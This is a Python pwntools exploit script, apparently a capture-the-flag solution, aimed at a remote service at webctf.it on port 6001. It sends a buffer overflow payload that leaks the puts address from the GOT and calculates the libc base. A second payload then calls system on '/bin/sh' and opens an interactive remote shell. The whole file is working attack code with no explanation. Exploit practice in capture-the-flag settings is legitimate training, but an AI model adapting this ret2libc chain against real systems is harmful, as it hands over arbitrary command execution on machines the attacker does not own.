from pwn import *

elf = ELF("shellcode")
libc = ELF("libc6_2.27-3ubuntu1_i386.so")
r = remote("webctf.it", 6001)
offset = 1012

payload = b'A' * offset
payload += p32(elf.plt['puts'])
payload += p32(elf.sym['main'])
payload += p32(elf.got['puts'])

r.recvuntil("your name?\n")
r.sendline(payload)
r.recvline()
puts = u32(r.recv(4))
log.success("puts leaked --> %s" % hex(puts))

libc_base = puts - libc.sym['puts']
log.success("libc_base --> %s" % hex(libc_base))
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

r.recvuntil("\n")

payload = b'A' * offset
payload += p32(system)
payload += b'AAAA'
payload += p32(binsh)

r.sendline(payload)
r.interactive()
